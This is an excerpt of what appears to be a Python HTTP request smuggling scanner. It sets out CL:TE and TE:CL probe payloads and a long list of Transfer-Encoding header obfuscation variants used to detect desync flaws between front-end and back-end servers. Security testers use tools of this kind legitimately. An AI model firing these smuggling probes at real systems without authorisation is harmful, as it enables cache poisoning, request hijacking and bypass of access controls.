...
banner()
CRLF = '\r\n'
t_base_headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/60.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'close', 'Content-Length': '0'}
t_colors = {'ref': 'cyan', 'attack': 'white', 'vulnerable': 'light_red'}
t_attacks_datas = [{'name': 'CL:TE1', 'Content-Length': 5, 'body': '1\r\nZ\r\nQ\r\n\r\n'}, {'name': 'CL:TE2', 'Content-Length': 11, 'body': '1\r\nZ\r\nQ\r\n\r\n'}, {'name': 'TE:CL1', 'Content-Length': 5, 'body': '0\r\n\r\n'}, {'name': 'TE:CL2', 'Content-Length': 6, 'body': '0\r\n\r\nX'}]
t_registered_method = ['vanilla', 'dualchunk', 'badwrap', 'space1', 'badsetupLF', 'gareth1', 'spacejoin1', 'nameprefix1', 'valueprefix1', 'nospace1', 'commaCow', 'cowComma', 'contentEnc', 'linewrapped1', 'quoted', 'aposed', 'badsetupCR', 'vertwrap', 'tabwrap', 'lazygrep', 'multiCase', 'zdwrap', 'zdspam', 'revdualchunk', 'nested', 'spacefix1_0', 'spacefix1_9', 'spacefix1_11', 'spacefix1_12', 'spacefix1_13', 'spacefix1_127', 'spacefix1_160', 'spacefix1_255', 'prefix1_0', 'prefix1_9', 'prefix1_11', 'prefix1_12', 'prefix1_13', 'prefix1_127', 'prefix1_160', 'prefix1_255', 'suffix1_0', 'suffix1_9', 'suffix1_11', 'suffix1_12', 'suffix1_13', 'suffix1_127', 'suffix1_160', 'suffix1_255', 'marcusmengs1', 'marcusmengs2']
...
t_exceptions = {}
t_vulnerable = {}
t_multiproc = {'n_current': 0, 'n_total': n_totest, 'd_output': d_output, 'f_output': f_output, '_verbose': _verbose}
